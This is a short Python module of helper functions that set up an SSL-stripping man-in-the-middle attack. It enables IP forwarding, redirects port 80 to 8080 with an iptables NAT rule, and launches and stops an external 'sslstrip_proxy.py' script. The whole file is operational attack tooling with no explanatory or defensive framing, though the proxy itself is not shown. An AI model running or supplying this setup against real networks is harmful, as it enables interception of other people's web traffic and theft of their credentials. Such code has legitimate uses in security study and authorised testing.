import os


def start_ip_forwarding():
    print("[*] Enabling IP forwarding...")
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")

def stop_ip_forwarding():
    print("[*] Disabling IP forwarding...")
    os.system("sudo sysctl -w net.ipv4.ip_forward=0")

def start_iptables_redirect():
    print("[*] Adding iptables rule to redirect port 80 to 8080...")
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

def stop_iptables_redirect():
    print("[*] Flushing iptables nat table...")
    os.system("sudo iptables -t nat -F")

def start_sslstrip():
    print("[*] Starting SSL strip proxy on port 8080...")
    os.system("sudo python2.7 sslstrip_proxy.py &")
    print("[*] SSL strip proxy started.")

def stop_sslstrip():
    print("[*] Stopping custom SSL strip proxy...")
    os.system("sudo pkill -f sslstrip_proxy.py")